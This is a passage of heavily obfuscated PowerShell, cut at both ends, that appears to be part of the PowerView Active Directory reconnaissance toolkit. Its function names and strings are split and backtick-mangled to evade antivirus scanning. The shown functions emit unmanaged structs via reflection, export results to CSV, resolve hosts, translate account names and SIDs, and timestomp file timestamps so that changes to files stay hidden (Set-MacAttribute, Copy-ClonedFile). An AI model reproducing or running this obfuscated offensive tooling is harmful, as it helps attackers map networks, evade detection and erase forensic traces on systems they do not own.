                ${A`T`T`RIbBUIld`er} = &("{1}{2}{0}" -f ("{2}{1}{0}"-f 'ject','b','w-O'),'N','e') ("{2}{9}{5}{7}{3}{4}{0}{1}{8}{10}{6}" -f 'mAt','tr',("{2}{0}{1}"-f'ef','lec','R'),'.',("{0}{1}"-f 'Cus','to'),'.Em','r','it',("{1}{0}" -f 'ute','ib'),("{0}{1}"-f 'ti','on'),("{1}{0}"-f 'e','Build'))(${c`oNStRucto`RI`NFo}, [Object[]] @(${un`manaG`ed`Type}))
            }

            ${nEWf`Ie`LD}.("{3}{1}{2}{0}"-f'te',("{0}{1}" -f 'tom','A'),("{0}{1}" -f't','tribu'),("{1}{0}{2}" -f 'u','SetC','s'))."INv`okE"(${A`TtRI`BBui`l`DeR})
        }

        if (${expLiCi`T`La`yOuT}) { ${nEW`F`IElD}.("{0}{2}{1}"-f ("{0}{1}" -f'SetO','ff'),'t','se')."I`NvokE"(${O`Ff`SeT}) }
    }

    
    
    ${s`Ize`MeTHod} = ${StrUc`T`Bu`i`lder}.("{0}{2}{1}{3}"-f 'D','et',("{1}{0}"-f 'fineM','e'),'hod')."I`NVoKe"(("{0}{1}"-f ("{0}{1}" -f 'Get','S'),'ize'),
        ("{1}{0}{2}{3}" -f 'l','Pub',("{1}{0}"-f', ','ic'),("{2}{0}{1}"-f 'tat','ic','S')),
        [Int],
        [Type[]] @())
    ${i`lGE`NERAt`Or} = ${s`iZEMe`ThOd}.("{2}{0}{3}{1}" -f ("{0}{1}" -f'et','ILG'),("{0}{1}" -f'at','or'),'G',("{1}{0}" -f'r','ene'))."INvo`ke"()
    
    ${i`lgE`Nerator}."E`mIT"( (  &("{1}{0}" -f'tEM','i') ("{3}{4}{2}{0}{1}" -f 'ble',':5A37','A','V','arI') )."VAL`Ue"::"l`DToK`en", ${S`TRUCTBui`ldER})
    ${ILgENe`Ra`T`Or}."em`it"( (&('LS') (("{0}{1}{2}"-f 'Var','I','Able:')+"5a3"+"7")  )."vaL`Ue"::"ca`Ll",
         (&("{2}{0}{1}"-f ("{0}{1}" -f'I','ABL'),'e','VaR') ('hO3'+'5') -ValueO).("{1}{0}{2}" -f'e',("{0}{1}"-f'Get','M'),("{0}{1}" -f 'th','od'))."In`VokE"(("{0}{1}{2}{3}" -f("{2}{1}{0}"-f 'Type','et','G'),'Fro',("{0}{1}"-f'mHan','d'),'le')))
    ${I`L`GEneR`AtOr}."eM`IT"( ${5`A37}::"c`ALL",
         ( &("{0}{1}"-f 'G','Ci')  ("vA"+"rIa"+("{1}{0}"-f ':8Sg','BlE')) )."va`lUE".("{2}{1}{0}"-f 'd','ho',("{0}{1}"-f'GetMe','t'))."In`Vo`kE"(("{0}{1}"-f 'Si',("{1}{0}"-f 'f','zeO')), [Type[]] @([Type])))
    ${iL`g`eNErat`Or}."e`MIt"(  (  &("{0}{1}" -f("{1}{0}" -f 'aRi','v'),("{1}{0}"-f 'lE','Ab')) ("5"+"A37"))."Va`lUE"::"R`eT")

    
    
    ${ImPLiC`IT`COn`VeRter} = ${Str`U`ct`B`UIldER}.("{0}{2}{1}" -f'Def','hod',("{0}{1}"-f'i','neMet'))."inV`OkE"(("{0}{1}{2}"-f'o',("{0}{2}{1}" -f'p','pl','_Im'),("{1}{0}" -f 'it','ic')),
        ("{2}{14}{5}{4}{10}{3}{1}{9}{12}{7}{6}{13}{11}{0}{8}" -f'a',("{0}{1}" -f't','atic,'),'Pr',', S',',','e',' Sp',',','me',("{0}{1}"-f ' Hi','de'),("{0}{1}" -f ' Pub','lic'),("{0}{1}"-f 'ial','N'),("{0}{1}"-f'By','Sig'),'ec',("{2}{0}{1}"-f'teS','cop','iva')),
        ${S`TR`UC`Tb`UIldER},
        [Type[]] @([IntPtr]))
    ${ilg`eN`ErAto`R2} = ${IM`PLicitc`ON`VerTer}.("{1}{2}{0}"-f ("{0}{1}" -f 'rat','or'),("{0}{1}" -f 'Ge','tI'),("{1}{0}"-f'ne','LGe'))."i`Nv`oke"()
    ${IlgeNE`RA`T`or2}."E`mit"(  (  &("{2}{3}{1}{0}" -f 'em','t',("{1}{0}" -f 'hILD','GEt-c'),'i') (("{1}{0}" -f'IA','vaR')+"Bl"+("{1}{0}" -f ':5a','e')+"37") )."v`AluE"::"N`OP")
    ${iL`geNeRATo`R2}."E`MiT"(  (  &("{0}{2}{3}{1}" -f ("{2}{0}{1}" -f 'R','i','geT-vA'),'le','a','B')  ('5'+'A37')  -ValUeoNl )::"Ld`Ar`g_0")
    ${IlgeNe`RaTo`R2}."EM`it"( ( &("{1}{0}{2}"-f'B',("{0}{1}" -f'GET-vAR','Ia'),'le') ("{0}{1}" -f'5','a37'))."v`ALue"::"LDtO`K`En", ${STRu`c`T`BUIlDer})
    ${i`LGEn`E`RaT`OR2}."e`Mit"( ${5A`37}::"ca`lL",
          ( &("{1}{0}" -f'tEm','i') ("{2}{1}{0}{3}" -f'a','i','vaR','BLe:ho35') )."v`AluE".("{0}{2}{1}"-f ("{1}{0}" -f'tMe','Ge'),'hod','t')."IN`VoKE"(("{1}{2}{3}{4}{0}" -f'le',("{1}{0}{2}" -f'tTy','Ge','pe'),'Fro','m',("{1}{0}"-f'nd','Ha'))))
    ${I`l`GeNerAtOR2}."e`Mit"( (&("{3}{2}{1}{0}"-f'Tem','Ldi','i','Ch') (("{0}{1}{2}"-f 'Va','ri','ABl')+'e:'+'5a'+'37') )."va`luE"::"c`All",
         ${8`SG}.("{0}{1}{2}"-f 'G',("{1}{2}{0}" -f 'o','etMet','h'),'d')."IN`VOkE"(("{1}{2}{0}{3}" -f'r',("{1}{0}{2}"-f 'tr','PtrToS','uc'),'tu','e'), [Type[]] @([IntPtr], [Type])))
    ${ILg`eNe`RATO`R2}."e`mit"( ( &("{1}{0}{3}{2}"-f'-','gET',("{0}{1}"-f'A','bLe'),("{1}{0}"-f 'i','VAr'))  ('5'+'A37') -VaLUEO)::"Unbox`_AnY", ${StrU`CtbU`i`lDeR})
    ${I`LG`enE`RatOr2}."e`MiT"( ${5a`37}::"r`et")

    ${S`TRuCT`BuiLd`Er}.("{0}{2}{1}" -f'Cr',("{0}{1}"-f 'T','ype'),("{1}{0}" -f 'e','eat'))."Invo`KE"()
}








function eX`p`orT`-`POweRvIeWc`sv {

    Param(
        [Parameter(MaNDatORY=${T`Rue}, vAlUEfRomPIpeLiNe=${t`RuE},
        ValuefromPIPeLINeBYPROperTyName=${tr`Ue})]
        [System.Management.Automation.PSObject]
        ${i`N`puTobjEcT},

        [Parameter(mAnDATory=${t`RUE}, POSiTIon=0)]
        [Alias({"{2}{0}{1}"-f("{1}{0}" -f 'Pat','S'),'h','P'})]
        [String]
        ${o`U`TfILE}
    )

    process {
        
        ${o`Bje`CTCsV} = ${i`Nput`obJe`Ct} | &("{2}{0}{1}{3}" -f 'nve',("{1}{0}" -f 'tTo-','r'),'Co','Csv') -NoTypeInformation

        
        ${M`UtEX} = &("{2}{1}{0}"-f ("{0}{1}" -f 'bjec','t'),("{0}{1}" -f'ew','-O'),'N') ("{5}{1}{4}{0}{2}{3}" -f 'ng',("{0}{1}{2}"-f 's','tem.Thr','e'),'.',("{1}{0}" -f 'ex','Mut'),'adi','Sy') ${f`A`lsE},{"{2}{0}{1}" -f("{0}{1}"-f'SV','Mu'),'tex','C'};
        ${n`UlL} = ${MuT`EX}.("{0}{2}{1}"-f ("{0}{1}"-f'W','ait'),'ne','O')."in`VokE"()

        if (&("{2}{0}{1}{3}"-f 't-P','at','Tes','h') -Path ${OU`TfI`le}) {
            
            ${oB`J`E`cTcsv} | &("{0}{2}{1}{3}" -f("{1}{0}{2}" -f 'ore','F','ach-'),("{1}{0}" -f'ec','bj'),'O','t') {${s`T`ART}=${t`Rue}}{if (${sta`RT}) {${St`ARt}=${fA`LsE}} else {${_}}} | &("{0}{2}{1}"-f'Out',("{0}{1}"-f'Fil','e'),'-') -Encoding ("{0}{1}" -f("{1}{0}"-f'I','ASC'),'I') -Append -FilePath ${o`Ut`FilE}
        }
        else {
            ${OB`jEc`TC`sV} | &("{2}{1}{0}" -f 'ile','t-F','Ou') -Encoding ("{1}{0}" -f'CII','AS') -Append -FilePath ${o`U`Tfile}
        }

        ${MU`TEX}.("{3}{1}{2}{0}" -f 'ex',("{1}{0}" -f'eM','eas'),'ut','Rel')."Inv`oke"()
    }
}



function Set`-M`Aca`T`T`RibUtE {

    [CmdletBinding(deFAuLtPaRAmeTerSeTnaME = {"{0}{1}"-f 'To','uch'})]
    Param (

        [Parameter(posItiON = 1,manDatoRY = ${t`RUE})]
        [ValidateScript({&("{1}{0}{2}"-f("{0}{1}" -f'e','st-'),'T',("{1}{0}"-f'ath','P')) -Path ${_} })]
        [String]
        ${fI`LEpaTh},

        [Parameter(ParamETeRsETNaMe = "to`UCH")]
        [ValidateScript({&("{2}{1}{0}" -f'ath',("{1}{0}" -f'P','st-'),'Te') -Path ${_} })]
        [String]
        ${O`ld`FIl`EpATh},

        [Parameter(PAraMEtERsETNAmE = "iNDi`V`iDuAl")]
        [DateTime]
        ${mOD`If`ied},

        [Parameter(PaRAmEterSETnaMe = "In`dIVI`DuaL")]
        [DateTime]
        ${Acc`esS`eD},

        [Parameter(parAmetErsETnAME = "in`D`IViDUAL")]
        [DateTime]
        ${CREA`Ted},

        [Parameter(PArameTERSEtName = 'All')]
        [DateTime]
        ${ALLmACa`T`TR`Ibutes}
    )

    
    function g`ET-m`AcATTr`I`BuTE {

        param(${OLDF`iLeNa`me})

        if (!(&("{0}{1}{2}"-f 'Te',("{0}{1}" -f 'st-P','a'),'th') -Path ${O`ldFilEN`A`ME})) {Throw ("{0}{2}{3}{1}"-f("{0}{1}" -f'Fil','e'),("{1}{0}"-f'Found',' '),' ','Not')}
        ${fIlEInfo`objE`CT} = (&("{0}{2}{1}"-f 'Get',("{1}{0}" -f 'm','Ite'),'-') ${o`LDF`i`Lename})

        ${OBJEC`Tp`R`OPe`Rt`IES} = @{("{0}{2}{1}"-f'Mo',("{0}{1}"-f 'f','ied'),'di') = (${fIleINFo`OB`jE`Ct}."la`stwrIt`etiME");
                              ("{2}{1}{0}" -f ("{1}{0}" -f'd','sse'),'ce','Ac') = (${fIleInF`O`Ob`JEcT}."LA`STacCESst`imE");
                              ("{0}{1}{2}"-f 'Cre','a','ted') = (${FiL`eiN`FOOBJ`E`ct}."CrE`ATi`OnTI`Me")};
        ${REsul`Tobj`E`cT} = &("{1}{0}{2}"-f ("{0}{1}"-f'w-','Obje'),'Ne','ct') -TypeName ("{1}{0}{2}"-f 'O','PS',("{1}{0}" -f'ct','bje')) -Property ${o`BJE`CtPRo`p`e`RTIes}
        Return ${Re`SULto`BjEct}
    }

    ${fi`le`InfO`o`BJecT} = (&("{0}{1}"-f ("{1}{0}"-f '-','Get'),("{0}{1}"-f 'It','em')) -Path ${f`ILEp`Ath})

    if (${PSBouN`dp`ARAM`e`T`ERS}[("{2}{1}{0}" -f("{0}{2}{1}"-f'i','s','bute'),'ttr',("{0}{2}{1}" -f'All','A','Mac'))]) {
        ${mod`IF`iEd} = ${Al`LMAC`A`TTRI`B`UTES}
        ${aC`ces`SEd} = ${A`lLmAcatt`RiB`UT`es}
        ${C`REAteD} = ${AllM`AcA`TT`RI`BU`TES}
    }

    if (${P`sBo`UN`DpaRaMETerS}[("{0}{3}{1}{2}"-f'Old','i',("{2}{1}{0}"-f 'h','ePat','l'),'F')]) {
        ${cOp`Y`FILE`maC} = (&("{3}{0}{1}{2}" -f("{0}{1}{2}" -f'et','-Mac','A'),'t',("{1}{0}{2}"-f'ib','tr','ute'),'G') ${oLd`Fi`leP`Ath})
        ${m`oDiF`Ied} = ${C`oP`yFiLeM`Ac}."mo`D`iFIeD"
        ${A`CCEs`SeD} = ${C`op`y`FiLemaC}."AC`Ce`sseD"
        ${C`RE`ATEd} = ${copYFIl`E`m`Ac}."CR`eatED"
    }

    if (${Mo`D`If`ied}) {${FIL`Ei`NFOobj`Ect}."lA`st`w`RiTeTImE" = ${MoD`IFi`ed}}
    if (${ACCE`sseD}) {${FI`LEINFO`Ob`Je`ct}."LastacC`E`SS`Time" = ${AC`ce`ssed}}
    if (${CreA`TeD}) {${Fi`lEInf`oO`BJe`CT}."c`ReAtion`TI`me" = ${cRe`A`TEd}}

    Return (&("{0}{3}{2}{4}{1}" -f ("{1}{0}" -f't-M','Ge'),'te',("{1}{0}" -f 'tr','At'),'ac','ibu') ${fi`l`epaTh})
}


function cOpY-clO`Ne`D`File {


    param(
        [Parameter(mandatoRy = ${t`RuE})]
        [String]
        [ValidateNotNullOrEmpty()]
        ${S`Ou`R`cEfIlE},

        [Parameter(mANdATorY = ${tr`UE})]
        [String]
        [ValidateNotNullOrEmpty()]
        ${De`stFI`Le}
    )

    
    &("{3}{4}{0}{2}{1}"-f ("{0}{1}{2}" -f 'MacAtt','r','ib'),'e','ut','Se','t-') -FilePath ${S`OUrc`Ef`IlE} -OldFilePath ${destfI`Le}

    
    &("{2}{3}{1}{0}"-f'em','-It','Cop','y') -Path ${soU`RcEf`IlE} -Destination ${D`EsTFILe}
}


function Get-`iPad`D`RE`SS {


    [CmdletBinding()]
    param(
        [Parameter(poSition=0,vALueFROMPipeLiNe=${Tr`Ue})]
        [Alias({"{2}{0}{1}"-f("{1}{0}"-f 'a','stN'),'me','Ho'})]
        [String]
        ${cOm`Pu`TerNAme} = ''
    )
    process {
        try {
            
            ${re`S`UlTs} = @((  ${5`7c}::("{0}{2}{3}{1}"-f'G',("{2}{1}{0}" -f 'y','ntr','ostE'),'et','H')."iNV`okE"(${c`O`MpUTe`R`NAmE}))."A`dDrESs`lISt")

            if (${rE`SuL`Ts}."cou`NT" -ne 0) {
                ForEach (${r`esU`Lt} in ${R`ESU`LTS}) {
                    
                    if (${REs`U`lt}."Ad`drESSF`Ami`LY" -eq ("{2}{1}{3}{0}"-f 'ork','ter','In',("{0}{1}"-f'Ne','tw'))) {
                        ${r`e`sUlt}."I`P`A`DDRe`ssTostRI`Ng"
                    }
                }
            }
        }
        catch {
            &("{0}{3}{2}{1}" -f 'Wr',("{2}{0}{1}" -f 'Ver','bose','-'),'te','i') -Message ("{3}{7}{1}{0}{6}{4}{2}{5}" -f("{0}{1}{2}" -f've',' ho','st '),("{1}{0}{3}{2}"-f'ot res','ld n','l','o'),("{1}{0}{2}" -f'd','IP Ad','re'),'C',' ','ss.',("{0}{1}"-f 'to',' an'),'ou')
        }
    }
    end {}
}


function CON`VERt-nAmEt`oS`id {

    [CmdletBinding()]
    param(
        [Parameter(MaNDATORy=${t`RuE},vALuEFrOMPIpeLiNE=${TR`UE})]
        [String]
        [Alias({"{0}{1}" -f'N','ame'})]
        ${obj`eCt`NaME},

        [String]
        ${DoM`AIn} = (&("{0}{2}{1}" -f'Get',("{2}{1}{0}" -f'main','Do','t'),'-Ne'))."N`AME"
    )

    process {
        
        ${OBjeC`TNa`me} = ${o`Bj`ECtName} -replace "/","\"
        
        if(${ob`je`C`TnaMe}.("{2}{1}{0}"-f's',("{1}{0}" -f 'ain','nt'),'co')."inv`Oke"("\")) {
            
            ${DO`maIn} = ${oB`jE`CtnAmE}.("{1}{0}" -f("{0}{1}" -f 'p','lit'),'s')."iN`VokE"("\")[0]
            ${o`BJe`CtNaME} = ${oB`je`ctn`AMe}.("{1}{0}"-f't',("{1}{0}"-f 'pli','s'))."iNvo`kE"("\")[1]
        }

        try {
            ${o`BJ} = (&("{0}{1}{2}" -f ("{2}{0}{1}" -f'w-O','b','Ne'),'jec','t') ("{8}{7}{9}{5}{3}{0}{1}{6}{4}{2}" -f 'TA','c','nt',("{1}{0}"-f'al.N','p'),'ou','nci','c',("{1}{0}{2}" -f 'te','ys','m.Securi'),'S',("{1}{0}"-f 'Pri','ty.'))(${do`m`Ain},${Ob`j`ECt`NAme}))
            ${o`Bj}."t`R`ANslAtE"([System.Security.Principal.SecurityIdentifier])."v`ALue"
        }
        catch {
            &("{3}{1}{0}{2}"-f 'er','V',("{1}{0}"-f'se','bo'),("{1}{0}"-f '-','Write')) ('I'+("{1}{0}"-f'val','n')+'id '+'ob'+'j'+("{3}{1}{0}{2}"-f'a','/n','me:','ect')+' '+"$Domain\$ObjectName")
            ${Nu`ll}
        }
    }
}


function c`o`NV`Ert-sI`dTON`Ame {

    [CmdletBinding()]
    param(
        [Parameter(MandATORy=${t`RuE},valuEFROMpipeLiNe=${tr`UE})]
        [String]
        ${s`id}
    )

    process {
        try {
            ${s`iD2} = ${s`ID}.("{1}{0}"-f'im','tr')."inv`o`ke"('*')

            
            
            Switch (${si`d2})
            {
                ("{1}{0}"-f'0',("{0}{1}" -f 'S','-1-'))         { ("{2}{1}{0}" -f 'ty',("{0}{2}{1}"-f ' Au','ori','th'),("{0}{1}" -f 'N','ull')) }
                ("{0}{2}{1}"-f ("{0}{1}"-f 'S-1','-'),'-0','0')       { ("{1}{0}" -f 'dy',("{0}{1}" -f 'N','obo')) }
                ("{1}{0}" -f'-1','S-1')         { ("{1}{3}{2}{0}"-f ("{0}{1}"-f 'ho','rity'),'Wo',("{1}{0}" -f 't',' Au'),'rld') }
                ("{0}{1}" -f 'S-',("{1}{0}" -f '1-0','1-'))       { ("{0}{1}" -f("{1}{0}"-f'o','Every'),'ne') }
                ("{1}{0}" -f'1-2','S-')         { ("{2}{3}{1}{0}{4}"-f'tho',' Au',("{0}{1}"-f'Loc','a'),'l',("{0}{1}"-f'r','ity')) }
                ("{0}{1}"-f("{0}{1}"-f 'S-1','-'),'2-0')       { ("{1}{0}"-f("{0}{1}"-f'oca','l'),'L') }
                ("{1}{2}{0}" -f ("{1}{0}"-f'2-1','1-'),'S','-')       { ("{3}{0}{4}{1}{2}" -f 'o',("{0}{1}" -f'e Log','o'),'n ',("{0}{1}" -f 'Co','ns'),'l') }
                ("{0}{1}"-f'S-1','-3')         { ("{0}{4}{2}{1}{3}"-f 'Cr','t','ori','y',("{2}{3}{1}{0}" -f'h','t','eato','r Au')) }
                ("{1}{2}{0}" -f'3-0','S-','1-')       { ("{0}{2}{1}" -f 'Cr','er',("{2}{0}{1}"-f 'ator ','Own','e')) }
                ("{0}{1}"-f("{0}{1}"-f 'S-1-','3'),'-1')       { ("{2}{1}{0}{3}"-f 'r',("{1}{2}{0}"-f' G','ato','r'),'Cre','oup') }
                ("{2}{1}{0}"-f'2','-',("{0}{1}"-f'S-1-','3'))       { ("{5}{3}{2}{0}{1}{4}" -f ("{1}{0}" -f'e','Owner S'),'rv','r ','to','er',("{0}{1}" -f 'Cr','ea')) }
                ("{1}{2}{0}"-f'3',("{0}{1}" -f 'S-1-','3'),'-')       { ("{4}{2}{0}{3}{1}"-f'oup','r',("{0}{1}"-f 'ato','r Gr'),("{2}{1}{0}" -f 'e','Serv',' '),'Cre') }
                ("{0}{1}"-f("{1}{0}" -f '1-3','S-'),'-4')       { ("{2}{3}{1}{0}"-f'ts','gh','Ow',("{2}{1}{0}" -f 'Ri','er ','n')) }
                ("{1}{0}" -f'4',("{1}{0}" -f '1-','S-'))         { ("{3}{6}{5}{0}{4}{2}{1}" -f("{0}{1}"-f 'e Au','t'),'y','rit',("{0}{1}" -f 'Non','-u'),'ho','iqu','n') }
                ("{1}{0}"-f '5',("{0}{1}"-f'S','-1-'))         { ("{2}{0}{1}{3}" -f("{2}{0}{1}" -f' Auth','or','T'),'it','N','y') }
                ("{0}{2}{1}"-f 'S-','-1','1-5')       { ("{0}{1}" -f'D',("{0}{1}" -f'i','alup')) }
                ("{1}{0}" -f ("{1}{0}{2}" -f'-5-','-1','2'),'S')       { ("{2}{0}{1}" -f 'et',("{0}{1}"-f 'w','ork'),'N') }
                ("{2}{1}{0}" -f'-3','1-5','S-')       { ("{1}{0}"-f'h',("{1}{0}" -f 'c','Bat')) }
                ("{1}{0}"-f '4',("{1}{0}"-f '-5-','S-1'))       { ("{2}{0}{3}{1}"-f 'nte',("{0}{1}"-f 'ct','ive'),'I','ra') }
                ("{2}{1}{0}"-f'5-6','1-','S-')       { ("{2}{0}{1}"-f 'rvi','ce','Se') }
                ("{0}{2}{1}" -f 'S','7',("{1}{0}" -f'-','-1-5'))       { ("{0}{1}{2}"-f'An',("{0}{1}"-f 'onymo','u'),'s') }
                ("{0}{1}" -f 'S-',("{0}{1}"-f '1','-5-8'))       { ("{1}{0}" -f 'oxy','Pr') }
                ("{1}{0}"-f ("{1}{0}" -f'-9','-1-5'),'S')       { ("{4}{1}{0}{7}{2}{5}{6}{3}"-f'r','erp','ma',("{0}{1}"-f'ler','s'),'Ent',("{1}{0}"-f'C','in '),("{1}{0}"-f 'ol','ontr'),("{1}{0}"-f 'se Do','i')) }
                ("{2}{0}{1}" -f'-1',("{1}{0}"-f'5-10','-'),'S')      { ("{0}{1}{2}{3}{4}"-f 'Pri','nc','i',("{1}{2}{0}"-f ' Se','pa','l'),'lf') }
                ("{0}{1}" -f ("{1}{0}"-f '1-','S-'),("{0}{1}" -f'5','-11'))      { ("{4}{0}{1}{3}{5}{2}"-f 'u',("{1}{0}" -f'ent','th'),("{1}{2}{0}"-f'ers','d U','s'),'ic','A','ate') }
                ("{0}{2}{1}"-f 'S-','-12','1-5')      { ("{1}{0}{2}{3}{4}" -f ("{0}{1}"-f'cte','d'),("{1}{2}{0}"-f'ri','Res','t'),' ','Cod','e') }
                ("{2}{1}{0}"-f '13',("{0}{1}" -f '-1-','5-'),'S')      { ("{2}{1}{5}{6}{0}{3}{4}" -f'er',("{0}{1}" -f 'in','al'),("{1}{0}"-f 'm','Ter'),("{1}{0}"-f 'Use',' '),'rs',("{0}{1}" -f ' Se','r'),'v') }
                ("{1}{0}{2}"-f("{1}{0}" -f '-1','-5'),'S-1','4')      { ("{5}{3}{6}{2}{1}{4}{0}" -f 'n','ive','act',("{0}{1}"-f 'te',' Int'),("{0}{1}"-f' ','Logo'),("{1}{0}" -f'o','Rem'),'er') }
                ("{2}{0}{1}" -f("{1}{0}" -f'1','-5-'),'5','S-1')      { ("{4}{3}{0}{5}{1}{2}"-f ("{0}{1}" -f 's',' Or'),'io','n ','i','Th',("{1}{0}{2}" -f'aniz','g','at')) }
                ("{1}{0}{2}" -f("{0}{1}" -f '1-5','-'),'S-','17')      { ("{3}{2}{1}{0}" -f ' ',("{1}{0}{2}" -f'zat','ani','ion'),("{0}{2}{1}" -f 'h',' Org','is'),'T') }
                ("{0}{1}{2}" -f'S-','1-',("{0}{1}"-f '5-','18'))      { ("{0}{1}{2}" -f ("{0}{1}"-f'Loc','al '),'Sys','tem') }
                ("{1}{2}{0}"-f'19',("{1}{0}" -f '-1-5','S'),'-')      { ("{1}{0}{2}"-f ("{0}{1}" -f'uth','ori'),("{0}{1}"-f 'NT ','A'),'ty') }
                ("{1}{0}" -f '0',("{0}{1}{2}" -f'S','-1-5','-2'))      { ("{0}{1}{2}"-f'NT ',("{0}{1}"-f 'Aut','hor'),'ity') }
                ("{0}{2}{1}"-f ("{2}{1}{0}"-f'-8','5','S-1-'),'0','0-')    { ("{2}{1}{3}{0}"-f ' ','rv',("{2}{1}{0}"-f 'e',' S','All'),("{0}{1}" -f'ice','s')) }
                ("{3}{1}{0}{2}"-f'5','-1-',("{2}{1}{0}" -f '44','5','-32-'),'S')  { ((("{5}{3}{0}{2}{4}{1}"-f 'str','s','at',("{2}{0}{1}" -f'in','i','UILTINLf3Adm'),'or','B')).("{1}{0}" -f 'ce',("{1}{0}"-f'Pla','re'))."invO`KE"('Lf3','\')) }
                ("{1}{3}{0}{2}"-f '-',("{1}{0}"-f '1-','S-'),'545',("{0}{1}"-f '5-','32'))  { ((("{3}{1}{2}{0}"-f'rs',("{1}{0}{2}"-f'o','UILTIN0r','U'),'se','B')).("{0}{2}{1}" -f ("{1}{0}" -f 'EPL','r'),'ce','a')."Invo`Ke"('0ro','\')) }
                ("{2}{0}{1}" -f'32-','546',("{0}{2}{1}" -f'S','-','-1-5'))  { ((("{4}{3}{1}{2}{0}" -f's','G',("{0}{1}"-f 'ue','st'),("{1}{0}"-f 'i','IN2Q'),("{0}{1}" -f 'BUIL','T')))."r`ePL`Ace"(([chAR]50+[chAR]81+[chAR]105),[STRING][chAR]92)) }
                ("{0}{1}{2}"-f ("{2}{0}{1}" -f '-1-5-','32-','S'),'5','47')  { ((("{0}{2}{3}{4}{1}" -f("{1}{0}"-f'L','BUI'),'rs','T','I',("{2}{0}{3}{1}{4}"-f'q','uP','N','M','ower Use'))) -cRepLAcE  ([ChAR]113+[ChAR]77+[ChAR]117),[ChAR]92) }
                ("{3}{0}{2}{1}" -f ("{0}{1}" -f'5','-32'),'48','-5',("{0}{1}"-f 'S-1','-'))  { ((("{1}{2}{5}{0}{3}{7}{8}{6}{4}" -f 'I','BUI','L',("{1}{0}"-f 'F','Nkj'),'s','T','or',("{2}{1}{0}" -f 'Ope','t ','Accoun'),'rat'))-rEPLaCE  'kjF',[CHAR]92) }
                ("{1}{2}{0}{3}"-f'5','S-1','-',("{1}{0}" -f '32-549','-'))  { ((("{2}{6}{4}{1}{0}{5}{3}" -f'e','}S','B',("{1}{0}"-f's','ator'),'{0',("{0}{1}" -f 'r','ver Oper'),("{2}{1}{0}" -f 'N','TI','UIL')))  -f [CHaR]92) }
                ("{2}{1}{0}" -f("{1}{0}"-f'550','-'),("{0}{2}{1}"-f '-','5-32','1-'),'S')  { ((("{2}{1}{0}{3}{4}"-f'O',("{2}{0}{3}{1}"-f 'LTI','int ','UI','NKnWPr'),'B','per',("{1}{0}"-f'rs','ato')))."reP`Lace"('KnW',[StRinG][chaR]92)) }
                ("{2}{1}{0}{3}"-f'5','-1-','S',("{0}{2}{1}"-f '-32-','51','5'))  { ((("{1}{3}{4}{5}{2}{0}" -f 'ors',("{0}{1}"-f 'BUI','LT'),("{1}{0}"-f 'at','er'),'IN','{0','}Backup Op')) -f [Char]92) }
                ("{0}{1}{3}{2}"-f ("{1}{0}"-f '-5','S-1'),'-',("{0}{1}"-f '2-55','2'),'3')  { ((("{0}{2}{3}{1}" -f ("{1}{0}"-f'C','BUILTIN'),("{2}{0}{1}" -f 'i','cators','Repl'),'K','w'))."r`epLaCE"(([cHAr]67+[cHAr]75+[cHAr]119),[stRINg][cHAr]92)) }
                ("{3}{2}{1}{0}"-f("{0}{1}"-f '2-','554'),'5-3','-','S-1')  { ((("{2}{9}{3}{10}{1}{0}{8}{6}{5}{11}{4}{7}"-f ("{0}{1}" -f '00 ','Compa'),' 20','BUI',("{1}{0}" -f'CP','INm5'),'e',("{0}{1}" -f'le A','c'),'b','ss','ti','LT',("{0}{2}{3}{1}"-f're','ows','-W','ind'),'c'))-REplaCE'm5C',[cHar]92) }
                ("{0}{2}{1}{3}"-f 'S',("{0}{1}"-f '1-5','-3'),'-',("{1}{0}" -f '555','2-'))  { ((("{6}{5}{0}{2}{1}{3}{4}{7}" -f 'NC','e',("{2}{1}{0}"-f'D',' ','BwRemote'),'skt',("{0}{2}{1}"-f 'o','se','p U'),("{1}{0}" -f'TI','IL'),'BU','rs'))-ReplAce ([CHAr]67+[CHAr]66+[CHAr]119),[CHAr]92) }
                ("{1}{0}{2}{3}" -f'32',("{0}{1}"-f 'S-1','-5-'),'-5','56')  { ((("{5}{9}{7}{1}{4}{2}{0}{10}{6}{3}{8}"-f 'C','9N',("{1}{0}"-f 'rk ','o'),("{1}{2}{0}"-f'Oper','ura','tion '),'etw','BU',("{1}{0}"-f 'fig','n'),'NO8',("{0}{1}" -f 'at','ors'),("{0}{1}" -f'I','LTI'),'o'))."rePL`A`ce"(([chaR]79+[chaR]56+[chaR]57),[sTRINg][chaR]92)) }
                ("{1}{0}{3}{2}"-f ("{1}{0}"-f '32','5-'),("{0}{1}"-f'S-','1-'),'557','-')  { ((("{6}{4}{2}{8}{3}{7}{10}{0}{1}{5}{9}"-f("{0}{1}" -f'Trust ','B'),'ui',("{1}{0}"-f '5','LTINF'),'nco','I','l','BU',("{2}{1}{0}"-f 're','ng Fo','mi'),'yI',("{1}{0}"-f's','der'),'st '))."Re`PLacE"(([chAR]70+[chAR]53+[chAR]121),[strinG][chAR]92)) }
                ("{1}{0}{2}" -f '2-5',("{1}{0}" -f '-1-5-3','S'),'58')  { ((("{7}{2}{1}{3}{0}{9}{5}{6}{4}{8}" -f'rma','r',("{0}{1}" -f'35P','e'),'fo','r U',("{1}{0}" -f 'Mon','e '),'ito',("{1}{2}{0}"-f'NQ','BUI','LTI'),("{1}{0}"-f 'rs','se'),'nc'))  -CREpLacE([char]81+[char]51+[char]53),[char]92) }
                ("{1}{2}{3}{0}"-f '559','S-',("{0}{1}" -f '1-','5-3'),'2-')  { ((("{3}{0}{5}{1}{4}{7}{6}{2}"-f'U','7Pe',("{1}{0}"-f ' Users','Log'),'B','rf',("{0}{1}{2}" -f 'I','L','TINWd'),("{2}{1}{0}"-f'e ','c','man'),'or')) -rEPlACe'Wd7',[CHar]92) }
                ("{1}{2}{0}"-f ("{1}{2}{0}"-f'32-560','5','-'),'S-1','-')  { ((("{5}{0}{1}{7}{3}{2}{8}{4}{6}" -f ("{1}{0}" -f 'riz','ho'),'at',' G',("{1}{0}"-f's',' Acces'),'ou',("{1}{6}{0}{2}{3}{4}{5}" -f'HW','BUILTI','i','n','dows A','ut','Noq'),'p','ion','r')) -CREPLAcE  'oqH',[cHaR]92) }
